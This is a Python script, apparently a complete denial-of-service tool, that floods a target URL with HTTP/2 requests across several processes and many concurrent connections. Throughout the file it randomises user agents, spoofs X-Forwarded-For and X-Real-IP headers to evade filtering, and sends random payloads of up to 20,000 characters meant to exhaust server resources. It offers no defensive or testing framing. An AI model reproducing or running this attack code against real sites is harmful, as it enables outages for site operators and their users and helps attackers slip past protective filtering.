# enhanced_http_flood.py - Enhanced Distributed HTTP/2 Flood Attack

import httpx
import asyncio
import threading
import time
import sys
import random
import string
import multiprocessing
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
# Get target URL from command-line arguments
if len(sys.argv) < 2:
    print("Usage: python cloud_http_flood.py <URL> [connections_per_process] [process_count]")
    sys.exit(1)

target_url = sys.argv[1]
# Get concurrent connections count from command-line or use default
concurrent_connections = int(sys.argv[2]) if len(sys.argv) > 2 else 100
# Get process count for multi-process distribution
process_count = int(sys.argv[3]) if len(sys.argv) > 3 else 2

print(f"Attacking {target_url} with {concurrent_connections} concurrent HTTP/2 connections across {process_count} processes.")

# Realistic User-Agent pool for request diversification
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
]

# HTTP methods for multi-vector attacks
http_methods = ['GET', 'POST', 'HEAD', 'OPTIONS']

# Target endpoints for diversified attacks
target_endpoints = ['/'] # can add here more target endpoints

# Global counters
successful_requests = 0
connection_count = 0
running = True

def generate_random_block_data():
    """
    Generates variable-size random data to exhaust server resources.
    Creates realistic-looking parameters with different sizes and patterns.
    """
    # Generate variable payload sizes (small to large)
    size_category = random.choice(['small', 'medium', 'large', 'xlarge'])
    
    if size_category == 'small':
        length = random.randint(50, 200)
    elif size_category == 'medium':
        length = random.randint(200, 1000)
    elif size_category == 'large':
        length = random.randint(1000, 5000)
    else:  # xlarge
        length = random.randint(5000, 20000)
    
    # Mix of different character types for realistic payloads
    chars = string.ascii_letters + string.digits + '_-.'
    random_data = ''.join(random.choice(chars) for _ in range(length))
    
    # Add realistic prefixes to make requests look legitimate
    prefixes = ['user_data_', 'block_', 'transaction_', 'session_', 'cache_', 'temp_']
    if random.random() < 0.4:
        random_data = random.choice(prefixes) + random_data
    
    return random_data

def generate_diversified_headers():
    """
    Generates randomized headers to simulate different clients and evade filtering.
    Enhanced for HTTP/2 compatibility.
    """
    headers = {
        'user-agent': random.choice(user_agents),
        'accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json,text/plain,*/*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        ]),
        'accept-language': random.choice([
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8'
        ]),
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': random.choice(['no-cache', 'max-age=0', 'no-store'])
    }
    
    # Add random custom headers occasionally
    if random.random() < 0.3:
        custom_headers = {
            'x-forwarded-for': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'x-real-ip': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'x-request-id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            'x-correlation-id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=20))
        }
        # Add 1-2 random custom headers
        for _ in range(random.randint(1, 2)):
            key, value = random.choice(list(custom_headers.items()))
            headers[key] = value
    
    return headers

async def distributed_http2_attack_worker(client, semaphore, process_id):
    """
    Individual HTTP/2 attack worker using shared client connection.
    Enhanced with multi-vector attack patterns.
    """
    global successful_requests, connection_count
    
    while running:
        async with semaphore:
            try:
                # Select random attack vector
                method = random.choice(http_methods)
                endpoint = random.choice(target_endpoints)
                full_url = target_url.rstrip('/') + endpoint
                
                # Generate attack payload
                block_data = generate_random_block_data()
                headers = generate_diversified_headers()
                
                # Prepare request data based on method
                if method in ['POST', 'PUT']:
                    # For POST/PUT, send data in body
                    data = {'block_data': block_data, 'payload_size': len(block_data)}
                    response = await client.request(method, full_url, headers=headers, data=data, timeout=10.0)
                else:
                    # For GET/HEAD/OPTIONS, send as query parameters
                    params = {'block_data': block_data}
                    response = await client.request(method, full_url, headers=headers, params=params, timeout=10.0)
                
                # Count successful responses
                if 200 <= response.status_code < 400:
                    successful_requests += 1
                    connection_count += 1
                    
                    # Occasionally print attack progress
                    if successful_requests % 100 == 0:
                        try:
                            if method == 'GET' and response.headers.get('content-type', '').startswith('application/json'):
                                result = response.json()
                                print(f"[Process {process_id}] Server computed: Block={result.get('block_data', '')[:20]}..., Method={method}")
                        except:
                            pass

            except (httpx.RequestError, asyncio.TimeoutError):
                # Handle connection errors, timeouts
                pass
            except Exception:
                # Handle any other errors silently
                pass

async def run_distributed_http2_attack(process_id, connections_per_process):
    """
    Main HTTP/2 attack function for a single process.
    Creates multiple connections with multiplexed streams.
    """
    # Create semaphore to limit concurrent requests per process
    semaphore = asyncio.Semaphore(connections_per_process)
    
    # Configure HTTP/2 client with aggressive connection pooling
    limits = httpx.Limits(
        max_keepalive_connections=50, 
        max_connections=100,
        keepalive_expiry=30.0
    )
    
    timeout = httpx.Timeout(connect=10.0, read=10.0, write=10.0, pool=5.0)
    
    async with httpx.AsyncClient(
        http2=True, 
        limits=limits, 
        timeout=timeout,
        follow_redirects=True
    ) as client:
        
        # Create multiple concurrent workers (more workers than semaphore allows for queuing)
        tasks = []
        worker_count = connections_per_process * 2  # More workers than concurrent limit
        
        for _ in range(worker_count):
            task = asyncio.create_task(distributed_http2_attack_worker(client, semaphore, process_id))
            tasks.append(task)
        
        try:
            # Run all workers concurrently
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            # Cancel all tasks on interrupt
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

def attack_process_worker(process_id, connections_per_process):
    """
    Worker function for each attack process.
    Runs the HTTP/2 attack in an asyncio event loop.
    """
    print(f"[Process {process_id}] Starting HTTP/2 attack with {connections_per_process} connections")
    
    try:
        asyncio.run(run_distributed_http2_attack(process_id, connections_per_process))
    except KeyboardInterrupt:
        print(f"[Process {process_id}] Attack interrupted")
    except Exception as e:
        print(f"[Process {process_id}] Error: {e}")

def print_attack_statistics():
    """
    Prints comprehensive attack statistics.
    """
    global successful_requests, connection_count
    last_requests = 0
    last_connections = 0
    
    while running:
        time.sleep(2)
        
        # Calculate rates
        current_requests = successful_requests
        current_connections = connection_count
        
        req_rate = (current_requests - last_requests) / 2
        conn_rate = (current_connections - last_connections) / 2
        
        print(f"[STATS] Requests/sec: {req_rate:.1f} | Total Requests: {current_requests} | "
              f"Connections/sec: {conn_rate:.1f} | Total Connections: {current_connections}")
        
        last_requests = current_requests
        last_connections = current_connections

def main():
    """
    Main function coordinating multi-process HTTP/2 attack.
    """
    global running
    
    print("Enhanced Distributed HTTP/2 Flood Attack")
    print("=" * 50)
    print(f"Target: {target_url}")
    print(f"Processes: {process_count}")
    print(f"Connections per process: {concurrent_connections}")
    print(f"Total concurrent connections: {process_count * concurrent_connections}")
    print("Attack uses HTTP/2 multiplexing with multi-vector techniques")
    print("Press Ctrl+C to stop the attack")
    print("=" * 50)
    
    # Start statistics thread
    stats_thread = threading.Thread(target=print_attack_statistics, daemon=True)
    stats_thread.start()
    
    # Create and start attack processes
    processes = []
    
    try:
        for process_id in range(process_count):
            p = multiprocessing.Process(
                target=attack_process_worker, 
                args=(process_id, concurrent_connections)
            )
            p.start()
            processes.append(p)
        
        # Wait for all processes
        for p in processes:
            p.join()
            
    except KeyboardInterrupt:
        print("\n[MAIN] Stopping all attack processes...")
        running = False
        
        # Terminate all processes
        for p in processes:
            p.terminate()
            p.join(timeout=5)
        
        print("[MAIN] All processes stopped.")
        print(f"[FINAL] Total successful requests: {successful_requests}")

if __name__ == "__main__":
    # Enable multiprocessing on all platforms
    multiprocessing.set_start_method('spawn', force=True)
    main()